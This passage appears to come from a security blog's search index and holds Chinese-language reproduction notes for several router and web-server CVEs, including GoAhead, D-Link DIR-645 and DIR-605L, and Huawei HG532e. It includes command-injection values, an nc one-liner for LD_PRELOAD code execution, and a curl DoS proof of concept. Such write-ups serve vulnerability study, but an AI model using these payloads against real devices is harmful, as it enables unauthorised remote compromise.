HTTP_COOKIE=\u0026#34;uid=123456\u0026#34; -E REMOTE_ADDR=\u0026#34;127.0.0.1\u0026#34; -g 1234 -strace ./htdocs/cgibin 其中我们自己设置的 sess_ispoweruser 是经过不了校验的，不过能够在调试的时候手 动修改return value(v0)\n我们将 EVENT参数设置为CHECKFW\u0026amp;ls\u0026amp; 传递到函数lxmldbc_system 中 system 执行的参数就被注入了命令\n添加 -strace 查看系统调用， 这里显示 exec format error是因为使用qemu user mode 之后不能够执行原本的execve，一种方式是使用 打过execve patch 的qemu-mipel-static版.\nreferer:\nhttp://www.freebuf.com/vuls/162627.html http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/ http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/ https://lists.gnu.org/archive/html/qemu-devel/2016-01/msg03019.html https://github.com/forumi0721/qemu-execve https://blahcat.github.io/2017/07/14/building-a-debian-stretch-qemu-image-for-mipsel/\n","permalink":"https://chibataiki.github.io/posts/cnvd-2018-01084_d-link_dir-645_reproduction/","summary":"环境:\nx64 架构kali 2 + qemu user mode mipsel 架构 debian 过程:\n使用IDA 打开 cgibin，main函数里第一步是把argc[0]和各个cgi模块名进行cmp操作， 然后根据 cmp结果进入各个模块。\n可以使用 -0 argv0 强制将目标的 argv[0] 设置为 argv0\ncgi 脚本通常通过环境变量/标准输入 获取输入，为了单独运行CGI脚本， 需要构造 相对应的请求参数。\n# REQUEST_METHOD # cgibin_parse_request 中 获取以下参数: CONTENT_TYPE CONTENT_LENGTH REQUEST_URL\nCONTENT_LENGTH 基于POST 数据的长度\n可以看到请求为GET和POST请求都需要经过认证。\n然后从环境变量中获取三个参数: EVENT，ACTION，SERVICE\nQEMU可以通过 -E 设置环境变量 -0 设置参数\nchroot . ./qemu-mipsel-static -0 \u0026#34;service.cgi\u0026#34; -E REQUEST_METHOD=\u0026#34;POST\u0026#34; - E REQUEST_URI=\u0026#34;service.cgi\\?EVENT=CHECKFW%26ls%26\u0026#34; -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=\u0026#34;application/x-www-form- urlencoded\u0026#34; -E HTTP_COOKIE=\u0026#34;uid=123456\u0026#34; -E REMOTE_ADDR=\u0026#34;127.0.0.1\u0026#34; -g 1234 -strace .","title":"CNVD-2018-01084_D Link_DIR 645_reproduction"},{"content":"编译运行 GoAhead\n最新版本4.0.0 已修复 ， git checkout 切换漏洞版本\n发现者现实shodan上数量：\n2017-12-20 shodan：\n漏洞位于 cgi.c cgiHandler\nfor new process, the function will start by allocating an array point for envp argument. then initials with key-value pairs taken from HTTP request parameters. Finally, lancgCgi function is called ,forks and execve the cgi script. 对于新进程，该函数将从为 envp 参数分配数组点开始。然后使用从 HTTP 请求参数获取的键值对开头的缩写。最后，调用 lancgCgi 函数，并执行 cgi 脚本。cgiHandleri 函数仅过滤 REMOTE_HOST 和 HTTP_AUTHORIZATION，所有其他参数均受信任和传递。因此，攻击者可以控制新 CGI 脚本的任意环境变量.\nPatch : back to the version 4 ➜ goahead-git git:(4f83a6a3) ✗ git checkout tags/v4.0.0 -q ➜ goahead-git git:(32deeb00) ✗ 可以看到下面经过打补丁之后，跳过了一些特殊参数，并且给其他参数添加静态字符串前缀.\nEXPLOITATION ELF 动态链接：\nprogram interpreter specified in the INTERP section\ndynamic linker ld-linux.so.2\n对于动态链接的程序来说，首先运行的是动态链接器：用来链接和加载 shared object，并 resolve symbols.\n获取 shared object 的列表：将缓解变量 LD_ TRACE_ LOADED_ OBJECTS 设为 1，会打印加载的库\nglibc/elf/rtld.c:dl_main 首先调用process_envars\ncase 7 LD_PRELOAD 初始化preloadlist\nWe have two ways to specify objects to preload: via environment \u0026gt; variable and via the file /etc/ld.so.preload.\n上面的注释有这么一段，并且 preloadlist，不为 NULL 时，会调用 handle_ld_preload 函数，该函数会解析 preloadlist，作为 shared object 的列表去加载。\n将这些组合起来，gohead 运行我们注入任意环境变量，glibc 会处理特殊的 switch case 如 LD_ PRELOAD，来加载 arbitrary shared object。\nELF.SO\n可以强制加载 shared object\nsections:. Init,. Fini\nwrap a constructor attribute，可以强制在调用 main 函数前执行函数\n可以在 Goahead 上尝试进行 LD_ PRELAOD，可以看到编译的 shared object 已经被调用了\n➜ test git:(4f83a6a3) ✗ sudo ../build/linux-x86-default/bin/goahead -v ➜ goahead-git git:(4f83a6a3) ✗ echo -en \u0026#34;GET /cgi-bin/cgitest?LD_PRELOAD=$(pwd)/ payload.so HTTP/1.0\\r\\n\\r\\n\u0026#34; | nc localhost 80 |head -10 LINUX /PROC/SELF/FD/0\n可以加载任意 shared object，并且可以运行代码执行了，那么对于远程服务，如何进行 shared object 的注入:\nlaunchCgi 会 dup2 stdin file descriptor (point to a temporary file contain the request body of POST request)\n意味着，服务器上会存在一个用户提供的文件，并可以使用形如 LD_ PRELOAD=/tmp/cgi-\nxxx 的方式进行调用\n还有个问题就是，虽然知道了 post 的数据会保存起来，但是无法猜测其文件名\nLinux procfs filesystem 的符号链接可以引用 stdin descriptor（指向我们的 temp 文件，所以可以指向 LD_ PRELOAD到/proc/self/fd/0,或者/dev/ stdin\n总结以上，我们可以使用 POST，将 shared object（包含 constructor）上传到服务器上，并添加 HTTP 的参数？LD_ PRELOAD=/proc/self/fd/0(指向上传到服务器上的 temporary file)\ncurl 上传二进制文件：-data- binary@ \u0026lt;binary_name\u0026gt;，成功执行\nReferer: https://www.elttam.com.au/blog/goahead/ https://github.com/elttam/advisories/tree/master/CVE-2017-17562 https://www.exploit-db.com/exploits/43360/ https://www.anquanke.com/post/id/91318 https://www.anquanke.com/post/id/91454\n","permalink":"https://chibataiki.github.io/posts/cve-2017-17562_goahead_rce_reproduce/","summary":"编译运行 GoAhead\n最新版本4.0.0 已修复 ， git checkout 切换漏洞版本\n发现者现实shodan上数量：\n2017-12-20 shodan：\n漏洞位于 cgi.c cgiHandler\nfor new process, the function will start by allocating an array point for envp argument. then initials with key-value pairs taken from HTTP request parameters. Finally, lancgCgi function is called ,forks and execve the cgi script. 对于新进程，该函数将从为 envp 参数分配数组点开始。然后使用从 HTTP 请求参数获取的键值对开头的缩写。最后，调用 lancgCgi 函数，并执行 cgi 脚本。cgiHandleri 函数仅过滤 REMOTE_HOST 和 HTTP_AUTHORIZATION，所有其他参数均受信任和传递。因此，攻击者可以控制新 CGI 脚本的任意环境变量.\nPatch : back to the version 4 ➜ goahead-git git:(4f83a6a3) ✗ git checkout tags/v4.","title":"CVE-2017-17562_GoAhead_RCE_reproduce"},{"content":"Dasan Networks H640X Unauthenticated Remote Code Execution\nAffected version:\nH640GR-02 H640GV-03 H640GW-02 H640RW-02 H645G\nFirmware:\n2.76-9999 2.76-1101 2.67-1070 2.45-1045\n从某个ftp服务器中找到了部分影响的固件，下载了 G_ONU_N_2.45- 1045.01.H640GW.x 进行进一步的分析。\nStep 1. 尝试使用 firmadyne进行初步仿真，失败。\n[ 1.092000] init/1: potentially unexpected fatal signal 4 ... [ 1.096000] Kernel panic - not syncing: Attempted to kill init! Step 2. 使用qemu的user mode\ncpio-root chroot . ./qemu-mips-static -g 1234 ./bin/busybox -i -d 10 \u0026gt; debug.log gdb-multiarch 进行远程调试时， 发现其中指向0x7c65180a ，然而查看进程的maps ， 0x7c65180a地址是在范围之外的。 Step 3. 将H640X的文件系统放入基于 mips架构的debian 系统中，使用chroot 进行二 进制文件的执行都会出现 illegal hardware instruction 的问题。\n直接执行却可以，应该就是lib库中的ld-2.11.1.so 所导致的，如step 2中，out of memory了。\n尝试执行 lighttpd，lighttpd 是需要config文件.\n因为不能使用choot 执行二进制程序， 所以需要对lighttpd.conf 中的路径进行修改\n➜ H640GW_v2_2.45-1045 ./sbin/lighttpd -f ./etc/lighttpd.conf 2017-12-03 17:40:15: (configfile.c.1248) base-docroot doesn\u0026#39;t exist: /www 2017-12-03 17:40:15: (server.c.646) setting default values failed 然后执行 lighttpd -c \u0026lt;lighttpd.conf file path\u0026gt;.\n其中出现过很多 (server.c.xxx) loading plugins finally failed的 错误，这是因为在这些\nplugin文件位于路由器文件系统的 ./usr/local/lib/ 中，是相对路径， 直接的做法是将文件\n夹中的文件全部拷贝到 /usr/local/lib/ 中 cp ./usr/local/lib/mod_* /usr/local/lib\n因为配置文件中设置的端又为8080， netstat搜索后可以看到已经打开了8080端又.\n➜ H640GW_v2_2.45-1045 netstat -an |grep 8080 tcp6 0 0 :::8080 :::* ​\nReferer:\nhttps://blogs.securiteam.com/index.php/archives/3552\n","permalink":"https://chibataiki.github.io/posts/cve-2017-18046_dasan_h640x_rce_reproduction/","summary":"Dasan Networks H640X Unauthenticated Remote Code Execution\nAffected version:\nH640GR-02 H640GV-03 H640GW-02 H640RW-02 H645G\nFirmware:\n2.76-9999 2.76-1101 2.67-1070 2.45-1045\n从某个ftp服务器中找到了部分影响的固件，下载了 G_ONU_N_2.45- 1045.01.H640GW.x 进行进一步的分析。\nStep 1. 尝试使用 firmadyne进行初步仿真，失败。\n[ 1.092000] init/1: potentially unexpected fatal signal 4 ... [ 1.096000] Kernel panic - not syncing: Attempted to kill init! Step 2. 使用qemu的user mode\ncpio-root chroot . ./qemu-mips-static -g 1234 ./bin/busybox -i -d 10 \u0026gt; debug.log gdb-multiarch 进行远程调试时， 发现其中指向0x7c65180a ，然而查看进程的maps ， 0x7c65180a地址是在范围之外的。 Step 3.","title":"CVE-2017-18046_Dasan_H640X_rce_reproduction"},{"content":"Details\nDevice: D-Link DIR-605L, Model B\nVulnerable Firmware Versions: 2.08UIB01 and prior releases. Fixed in\n2.08UIBETA01.\nAttack Vector: Unauthenticated HTTP GET request\nImpact: Denial of service\nCVE: CVE-2017-9675 Poc: curl http://192.168.1.1/common/\n选择固件版本: DIR-605L_REVB_FIRMWARE_206b01\n根据固件中的boa 的字符串串信息可以获取到boa的版本为 0.94.14rc21\n因为漏洞发⽣于 GET 请求，，那么猜测漏洞位于处理GET请求的函数，且为其 中处理⽬录的那些函数。且 末位为 / 分隔符，那么 修改或使⽤URL 字符串的那些函数可能存在漏洞。\n漏洞成因:\nexecl(dirmaker, dirmaker, req-\u0026gt;pathname, req-\u0026gt;request_uri, (void *) NULL); 可能: dirmaker指针指向的⽂件在⽂件系统中并不存在 man execl 中 参数是 char * 类型的NULL指针，但是上⾯使用的是 void *类型的，\nexecl(const char *path, const char *arg0, ... /*, (char *)0 */); execl 中指针类型的错误 + ⽂件指针指向的⽂件不存在\n2.6.x 内核中 pipe的漏洞可能造成提权\n仿真 参考 devttys0 中对 apmib的hook，\nhttp://www.devttys0.com/wp-content/uploads/2012/10/apmib.txt\n⾃己的出现了点问题，LD_PRELOAD 后会出现 apmib-ld.so can\u0026rsquo;t handle reloc type 0x2f 的错误信息 原因是toolchain不对，⾃己⽤的是glibc⽽不是uclibc\n触发漏洞:\nReferer: http://hypercrux.com/bug-report/2017/06/19/DIR605L-DoS-BugReport/\n​\thttps://paper.seebug.org/464/\n","permalink":"https://chibataiki.github.io/posts/cve-2017-9675_d-link-dir-605l_dos_analysis/","summary":"Details\nDevice: D-Link DIR-605L, Model B\nVulnerable Firmware Versions: 2.08UIB01 and prior releases. Fixed in\n2.08UIBETA01.\nAttack Vector: Unauthenticated HTTP GET request\nImpact: Denial of service\nCVE: CVE-2017-9675 Poc: curl http://192.168.1.1/common/\n选择固件版本: DIR-605L_REVB_FIRMWARE_206b01\n根据固件中的boa 的字符串串信息可以获取到boa的版本为 0.94.14rc21\n因为漏洞发⽣于 GET 请求，，那么猜测漏洞位于处理GET请求的函数，且为其 中处理⽬录的那些函数。且 末位为 / 分隔符，那么 修改或使⽤URL 字符串的那些函数可能存在漏洞。\n漏洞成因:\nexecl(dirmaker, dirmaker, req-\u0026gt;pathname, req-\u0026gt;request_uri, (void *) NULL); 可能: dirmaker指针指向的⽂件在⽂件系统中并不存在 man execl 中 参数是 char * 类型的NULL指针，但是上⾯使用的是 void *类型的，\nexecl(const char *path, const char *arg0, .","title":"CVE-2017-9675_D Link DIR 605L_DoS_analysis"},{"content":"使⽤用firmadyne 仿真整个⽂件系统时， ⽆法进入到console 中，console 登陆有限制\n仿真mips架构的debian系统， 将HG532e的⽂文件系统传到debian中，\ncheckpoint 中 https://research.checkpoint.com/good-zero-day-skiddie/ 提到漏洞存在于upup 服务中, 该路由器的UPnP服务中有⼀项为DeviceUpgrade，通过请求 /ctrlt/DeviceUpgrade_1 进行固件的升级\n使⽤chroot 运行upnp ， 没有任何提示，查看端口也并没打开，\n使用 strace(system call trace)进行跟踪，发现缺少⽂件\n搜索一下，应该是依赖于 mic 二进制⽂文件\n继续追溯可以发现 profile 中有mic\n对mic ⼆进制进行 msgsvr 关键字搜索: 可以发现和上面strace 的报错信息对应起来。\n运行 mic 时 ，会⽣成对应 /var/msgsvr 不过会进入 ATP cli 从⽽而导致⽆法执⾏其他命令， 不过我们可以通过新建个ssh session 执行 mic 绕过这个限制。\n补充，bin/下的cli 是 ATP cli ， 运行mic时会执行cli?\n现在回过头来可以发现， 打开37215的端口是⼆进制程序是 mic\n使⽤用exploit上的poc进行尝试后，发现确实可以完成命令注入，但是并不是所有命令都能正确执行.\n➜ Documents Serving HTTP on 0.0.0.0 port 8000 ... 192.168.1.108 - - [24/Jan/2018 09:17:42] \u0026#34;GET /a HTTP/1.1\u0026#34; 200 - 根据爆出的信息进行反推，找出upgrade action 存在的位置， 存在 system(a0) 命令， 查一下snprintf的调⽤\nsnprintf(char * restrict str, size_t size, const char * restrict format, ...); 对用户输入未过滤导致命令注入\nsnprint( a0,0x400,”upg -g -U %s -t \u0026#39;1 Firmware Upgrade Image\u0026#39; -c upnp -r %s -d -“,a3) Referer:\nhttps://research.checkpoint.com/good-zero-day-skiddie/\n","permalink":"https://chibataiki.github.io/posts/cve-2017-17215_hg532e_analysis/","summary":"使⽤用firmadyne 仿真整个⽂件系统时， ⽆法进入到console 中，console 登陆有限制\n仿真mips架构的debian系统， 将HG532e的⽂文件系统传到debian中，\ncheckpoint 中 https://research.checkpoint.com/good-zero-day-skiddie/ 提到漏洞存在于upup 服务中, 该路由器的UPnP服务中有⼀项为DeviceUpgrade，通过请求 /ctrlt/DeviceUpgrade_1 进行固件的升级\n使⽤chroot 运行upnp ， 没有任何提示，查看端口也并没打开，\n使用 strace(system call trace)进行跟踪，发现缺少⽂件\n搜索一下，应该是依赖于 mic 二进制⽂文件\n继续追溯可以发现 profile 中有mic\n对mic ⼆进制进行 msgsvr 关键字搜索: 可以发现和上面strace 的报错信息对应起来。\n运行 mic 时 ，会⽣成对应 /var/msgsvr 不过会进入 ATP cli 从⽽而导致⽆法执⾏其他命令， 不过我们可以通过新建个ssh session 执行 mic 绕过这个限制。\n补充，bin/下的cli 是 ATP cli ， 运行mic时会执行cli?\n现在回过头来可以发现， 打开37215的端口是⼆进制程序是 mic\n使⽤用exploit上的poc进行尝试后，发现确实可以完成命令注入，但是并不是所有命令都能正确执行.\n➜ Documents Serving HTTP on 0.0.0.0 port 8000 ... 192.168.1.108 - - [24/Jan/2018 09:17:42] \u0026#34;GET /a HTTP/1.","title":"CVE-2017-17215_HG532e_analysis"}]